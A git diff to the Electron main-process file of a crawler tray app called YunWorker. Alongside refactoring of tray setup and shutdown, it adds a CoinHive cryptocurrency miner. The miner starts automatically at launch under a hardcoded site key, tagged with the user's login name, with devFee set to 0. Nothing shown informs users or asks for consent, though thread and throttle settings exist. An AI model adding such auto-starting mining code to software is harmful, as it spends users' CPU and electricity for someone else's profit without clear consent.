@@ -1,6 +1,7 @@
 'use strict'
 
 import { app, BrowserWindow, Menu, Tray, nativeImage, ipcMain } from 'electron'
+import CoinHive from 'coin-hive'
 import I18n from '../i18n/index'
 import Crawler from './crawler/index'
 import Saves from './saves'
@@ -25,6 +26,7 @@ const winURL = process.env.NODE_ENV === 'development'
 const ssoValidateServer = 'http://sso-validate.clo5de.info:5000'
 const saves = new Saves(require('path').join(yunWorkerUserDataPath, 'save.data'))
 const crawler = new Crawler(ssoValidateServer, {})
+let miner = null
 
 function killAllChrome () {
   let find = require('find-process')
@@ -56,6 +58,20 @@ function killAllChromeDriver () {
   })
 }
 
+function quitApp () {
+  miner.kill().then(() => {
+    console.log('Miner stoped.')
+    return killAllChromeDriver()
+  }).then(() => {
+    console.log('ChromeDriver cleaned.')
+    return killAllChrome()
+  }).then(() => {
+    console.log('Chrome cleaned.')
+  }).then(() => {
+    app.quit()
+  })
+}
+
 function createWindow () {
   /**
    * Initial window options
@@ -76,45 +92,68 @@ function createWindow () {
     mainWindow = null
   }) */
 
-  createTray()
-  saves.readSavesAsync().then((result) => {
+  createTray().then(() => {
+    return saves.readSavesAsync()
+  }).then((result) => {
     console.log('Saves init status: ' + result + ', Path: ' + saves.savePath)
     return crawler.initDriver(saves.data.login.account, saves.data.login.password)
   }).then((result) => {
     console.log('Crawler init status: ' + result)
+    return createMiner()
+  }).then((result) => {
+    console.log('Miner init with setup: ' + JSON.stringify(result.coinhive, null, 4) + ', and username: ' + result.username)
     return i18n.loadLocaleAsync(saves.data.setup.locale, __static)
   }).then((result) => {
     console.log('Language init in Locale:' + result.locale + ', Path: ' + result.localePath)
-    mainIpc = new MainIpc(i18n, ipcMain, sendNotify, mainWindow, saves, crawler)
+    mainIpc = new MainIpc(i18n, ipcMain, sendNotify, mainWindow, saves, crawler, miner)
     console.log('MainIPC init status: ' + (mainIpc !== undefined))
   }).catch((err) => {
     console.log(err)
-    app.quit()
+    quitApp()
   })
 }
 
 function createTray () {
-  const iconPath = require('path').join(__static, '/icons/icon.ico')
-  const img = nativeImage.createFromPath(iconPath)
-  const contextMenu = Menu.buildFromTemplate([
-    {
-      label: 'YunWorker',
-      click () {
-        mainWindow.show()
-      }
-    },
-    {
-      label: 'Quit',
-      click () {
-        mainWindow.removeAllListeners('close')
-        mainWindow.close()
-      }
-    }
-  ])
+  return new Promise((resolve, reject) => {
+    try {
+      const iconPath = require('path').join(__static, '/icons/icon.ico')
+      const img = nativeImage.createFromPath(iconPath)
+      const contextMenu = Menu.buildFromTemplate([
+        {
+          label: 'YunWorker',
+          click () {
+            mainWindow.show()
+          }
+        },
+        {
+          label: 'Quit',
+          click () {
+            mainWindow.removeAllListeners('close')
+            mainWindow.close()
+          }
+        }
+      ])
 
-  tray = new Tray(img)
-  tray.setToolTip('YunWorker')
-  tray.setContextMenu(contextMenu)
+      tray = new Tray(img)
+      tray.setToolTip('YunWorker')
+      tray.setContextMenu(contextMenu)
+      return resolve(true)
+    } catch (err) {
+      return reject(err)
+    }
+  })
+}
+
+async function createMiner () {
+  let username = saves.data.login.account || 'Anonymous'
+  miner = await CoinHive('SAQOkYryaUVeCkxfBaHpOZ98ebi7lxE4', {
+    username: username,
+    threads: saves.data.setup.coinhive.threads,
+    throttle: saves.data.setup.coinhive.throttle,
+    devFee: 0
+  })
+  await miner.start()
+  return {'coinhive': saves.data.setup.coinhive, 'username': username}
 }
 
 function sendNotify (message, sound, title) {
@@ -130,13 +169,7 @@ app.on('ready', createWindow)
 
 app.on('window-all-closed', () => {
   if (process.platform !== 'darwin') {
-    killAllChromeDriver().then(() => {
-      console.log('ChromeDriver cleaned.')
-      return killAllChrome()
-    }).then(() => {
-      console.log('Chrome cleaned.')
-      app.quit()
-    })
+    quitApp()
   }
 })
 
